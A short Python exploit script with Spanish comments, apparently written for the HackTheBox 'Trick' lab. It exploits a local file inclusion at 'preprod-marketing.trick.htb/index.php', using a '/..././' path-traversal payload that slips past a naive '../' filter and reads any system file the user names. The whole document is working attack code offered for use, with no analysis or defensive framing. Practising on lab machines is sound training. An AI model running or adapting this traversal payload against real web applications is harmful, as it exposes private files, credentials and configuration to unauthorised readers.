#!/usr/bin/python3

import requests
import argparse
import signal

# -------------------------+
# Funciones del programa
# -------------------------+

# (*) Controlamos salida forzada con CTRL+C
def forced_exit():
    print("^C\n")
    exit(0)

signal.signal(signal.SIGINT, forced_exit)

# (*) Argumentos del programa
def arguments():
    parse = argparse.ArgumentParser()
    parse.add_argument(dest="file_name", type=str, help="Archivo del sistema a mostrar.")
    return parse.parse_args()

# (*) Ejecución y explotación del Local File Inclusion
def lfi(file_name):
    print(f"(+) Leyendo archivo {file_name} en el sistema...\n")

    data_get = {"page": "/..././..././..././..././..././..././..././.../." + file_name}
    r = requests.get(url_site + '/index.php', params=data_get)

    if not r.text:
        print("(-) Archivo inexistente o no tenemos permiso para verlo.")
    else:
        print(r.text)

# -------------------------+
# Variables globales
# -------------------------+

url_site = "http://preprod-marketing.trick.htb"

# -------------------------+
# Inicio del programa
# -------------------------+

if __name__ == '__main__':
    args = arguments()

    try:
        requests.get(url_site)
    except requests.exceptions.ConnectionError as err:
        print("(-) Agrega el dominio 'preprod-marketing.trick.htb' al /etc/hosts, o valida conexión.")
        exit(1)

    lfi(args.file_name)
